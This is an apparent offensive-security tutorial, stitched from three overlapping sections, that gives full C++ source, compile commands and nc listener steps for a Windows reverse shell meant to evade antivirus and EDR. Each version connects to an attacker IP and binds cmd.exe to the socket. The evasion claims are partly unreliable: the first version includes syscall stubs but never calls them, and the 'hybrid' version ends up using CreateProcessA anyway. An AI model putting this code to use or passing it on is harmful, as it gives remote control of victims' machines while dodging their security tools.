# Leveraging Syscalls to Evade AV/EDR in a Reverse Shell

## Introduction
This document details the process of creating a reverse shell in C++ that leverages syscalls to evade detection by Antivirus (AV) and Endpoint Detection and Response (EDR) systems. The reverse shell initially uses standard Windows API calls, which are then replaced with direct syscalls to avoid user-mode hooks commonly implemented by AV/EDR solutions.

## Step 1: Setting Up the Development Environment

### Tools Required:
- **MinGW-w64**: A compiler for Windows that supports C++.
- **SysWhispers2**: A tool that generates syscall stubs for various Windows functions.

### Installing MinGW-w64:
Install MinGW-w64 to compile the C++ code:
```bash
sudo apt-get install mingw-w64
```

### Cloning and Setting Up SysWhispers2:
Clone the SysWhispers2 repository:
```bash
git clone https://github.com/jthuraisamy/SysWhispers2.git
cd SysWhispers2
```
Generate syscall stubs:
```bash
python3 syswhispers.py --functions NtCreateThreadEx,NtClose --out-file syscalls
```

This command generates two files: `syscalls.c` and `syscalls.h`.

## Step 2: Writing the Syscall Reverse Shell Code

### Reverse Shell Using Windows Syscalls:
Here is the initial version of the reverse shell using the Windows Syscalls:

```cpp
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include "/path/to/your/SysWhispers2/syscalls.h"

#pragma comment(lib, "Ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return 1;
    }

    // Define server address
    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Your port
    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Your IP

    // Connect to server
    if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "Connection failed.\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Prepare STARTUPINFO structure for cmd.exe
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Create cmd.exe process using CreateProcess
    if (!CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed.\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait for the cmd.exe process to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}
```

### Explanation:
- **CreateProcess**: This function creates a new process (`cmd.exe`) with input/output redirected to the socket, enabling the reverse shell.
- **Socket Management**: The socket is created and connected to the remote listener, then passed to the `cmd.exe` process.
- **Cleanup**: After the process completes, resources are properly cleaned up.

## Step 3: Compiling the Reverse Shell

Use the following command to compile the reverse shell:
```bash
x86_64-w64-mingw32-g++ reverse_shell.cpp -o reverse_shell.exe -lws2_32 -static-libstdc++ -static-libgcc
```

## Step 4: Running the Reverse Shell

1. **Start a Listener**: 
   On your attacker machine (IP `192.168.1.100`), start a listener:
   ```bash
   nc -lvnp 4444
   ```

2. **Run the Reverse Shell**:
   Execute the `reverse_shell.exe` on the target machine.

3. **Verify Connection**:
   Ensure that the reverse shell connects back to your listener.

# Creating a Reverse Shell Using Windows API

## Introduction
This document outlines the process of creating a basic reverse shell in C++ using the Windows API and explores the benefits and process of replacing certain API calls with syscalls. By leveraging syscalls, we can evade detection by AV (Antivirus) and EDR (Endpoint Detection and Response) systems.

## Step 1: Setting Up the Development Environment

### Tools Required:
- **MinGW-w64**: A compiler for Windows that supports C++.
- **SysWhispers2**: A tool that generates syscall stubs for various Windows functions.

### Installing MinGW-w64:
Install MinGW-w64 to compile the C++ code:
```bash
sudo apt-get install mingw-w64
```

## Step 2: Writing the Reverse Shell Code

### Reverse Shell Using Windows API:
Here is the code for the reverse shell using the Windows API:

```cpp
#include <winsock2.h>
#include <windows.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Define server address
    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Change this to your desired port
    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Change this to your attacker's IP

    // Connect to server
    WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);

    // Prepare STARTUPINFO structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Create the process (cmd.exe)
    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    // Wait for the process to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    closesocket(sock);
    WSACleanup();
    return 0;
}
```

### Explanation:
- **Winsock Initialization**: The program starts by initializing Winsock, which is necessary for network communication on Windows.
- **Socket Creation**: A TCP socket is created using `WSASocket`.
- **Connection to Server**: The program connects to the specified server IP and port.
- **Process Creation**: The program creates a new process (`cmd.exe`) and redirects its input, output, and error streams to the socket, establishing a reverse shell.
- **Cleanup**: The program waits for the process to terminate and cleans up resources.

## Step 3: Compiling the Reverse Shell

Use the following command to compile the reverse shell:
```bash
x86_64-w64-mingw32-g++ reverse_shell.cpp -o reverse_shell.exe -lws2_32 -static-libstdc++ -static-libgcc
```

## Step 4: Running the Reverse Shell

1. **Start a Listener**: 
   On your attacker machine (IP `192.168.1.100`), start a listener:
   ```bash
   nc -lvnp 4444
   ```

2. **Run the Reverse Shell**:
   Execute the `reverse_shell.exe` on the target machine.

3. **Verify Connection**:
   Ensure that the reverse shell connects back to your listener.

# Creating a Reverse Shell Using a Hybrid approach

## Introduction

This document outlines the process of creating a reverse shell in C++ using a combination of raw syscalls and the Windows API. The goal is to leverage syscalls for process creation while maintaining reliability with API calls where necessary. This approach helps evade detection by AV (Antivirus) and EDR (Endpoint Detection and Response) systems while ensuring the reverse shell remains functional across different environments.
## Step 1: Setting Up the Development Environment

### Tools Required:

- MinGW-w64: A compiler for Windows that supports C++.
- SysWhispers2 (optional): A tool for generating syscall stubs (not used in the final approach).

### Installing MinGW-w64:

Install MinGW-w64 to compile the C++ code on Linux:

**Command to install MinGW-w64:**

```bash
sudo apt-get install mingw-w64
```

## Step 2: Writing the Reverse Shell Code

### Reverse Shell Using a Hybrid Approach:


```c
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <winternl.h>

#pragma comment(lib, "Ws2_32.lib")

#define STATUS_SUCCESS ((NTSTATUS)0x00000000)

typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    BOOLEAN InJob
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    std::cerr << "[DEBUG] Initializing Winsock...\n";
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[ERROR] WSAStartup failed.\n";
        return 1;
    }

    std::cerr << "[DEBUG] Creating socket...\n";
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "[ERROR] Socket creation failed.\n";
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("192.168.1.87");

    std::cerr << "[DEBUG] Attempting to connect to server...\n";
    if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "[ERROR] Connection to server failed.\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    std::cerr << "[DEBUG] Connected to server.\n";

    std::cerr << "[DEBUG] Resolving NtCreateProcessEx and NtCreateThreadEx...\n";
    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateProcessEx");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");

    if (!NtCreateProcessEx || !NtCreateThreadEx) {
        std::cerr << "[ERROR] Failed to resolve NtCreateProcessEx or NtCreateThreadEx.\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cerr << "[DEBUG] NtCreateProcessEx and NtCreateThreadEx resolved.\n";

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES objAttr;
    ZeroMemory(&objAttr, sizeof(objAttr));
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    std::cerr << "[DEBUG] Creating cmd.exe process using NtCreateProcessEx...\n";
    NTSTATUS status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, &objAttr, GetCurrentProcess(), 0, NULL, NULL, NULL, FALSE);

    if (status != STATUS_SUCCESS) {
        std::cerr << "[ERROR] NtCreateProcessEx failed with status code: " << status << "\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cerr << "[DEBUG] Process created successfully.\n";

    // Fallback to API if syscall thread creation fails
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    std::cerr << "[DEBUG] Attempting to execute cmd.exe using CreateProcessA as a fallback...\n";
    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "[ERROR] CreateProcessA failed.\n";
        CloseHandle(hProcess);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cerr << "[DEBUG] cmd.exe started successfully using CreateProcessA.\n";
    
    // Wait for cmd.exe to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hProcess);
    closesocket(sock);
    WSACleanup();

    std::cerr << "[DEBUG] Cleanup complete.\n";
    return 0;
}

```

### Explanation:

1. **Winsock Initialization**: The program starts by initializing Winsock, necessary for network communication on Windows.
2. **Socket Creation**: A TCP socket is created using `WSASocket`.
3. **Connection to Server**: The program connects to the specified server IP and port.
4. **Syscall Process Creation**: The program attempts to create a process using `NtCreateProcessEx`.
5. **Fallback to API**: If the syscall thread creation fails, the program falls back to using `CreateProcessA` to execute `cmd.exe`.
6. **Cleanup**: The program waits for `cmd.exe` to terminate and then cleans up resources.

## Step 3: Compiling the Reverse Shell

Use the following command to compile the reverse shell:

```bash
x86_64-w64-mingw32-g++ rev_syscall_raw.cpp -o rev_syscall_raw.exe -lws2_32 -static-libstdc++ -static-libgcc
```

## Step 4: Running the Reverse Shell

1. **Start a Listener**: On your attacker machine (IP 192.168.1.87), start a listener:
        ``
```bash
    nc -lvnp 4444
```
    
2. **Run the Reverse Shell**: Execute the `rev_syscall_raw.exe` on the target machine.
    
3. **Verify Connection**: Ensure that the reverse shell connects back to your listener.

## Troubleshooting and Moving to a Hybrid Approach

### Challenges Encountered:

1. **Process Context Issues**: When using `NtCreateProcessEx`, the new process lacked a complete environment context (PEB, TEB), causing issues when trying to execute commands or start threads.
2. **Thread Creation Failure**: The syscall-based thread creation using `NtCreateThreadEx` failed with `STATUS_NOT_SUPPORTED`, highlighting that certain low-level operations were either unsupported or incomplete without additional context setup.
3. **Environmental Dependencies**: Implementing a fully syscall-based reverse shell requires deep knowledge of NT structures, which can be fragile across different Windows versions.

### Why a Hybrid Approach Was Necessary:

To ensure reliability and maintain functionality across different systems, we integrated a fallback to the Windows API. The hybrid approach uses raw syscalls for process creation but relies on `CreateProcessA` to start `cmd.exe` if the syscall-based method fails. This balance maintains the stealth benefits of syscalls while ensuring the reverse shell operates effectively, making it ideal for live demonstrations.

## Conclusion

The hybrid approach successfully demonstrates the use of syscalls for process creation while ensuring robustness with API fallbacks. This method provides a practical way to showcase syscall techniques while maintaining compatibility across different environments.
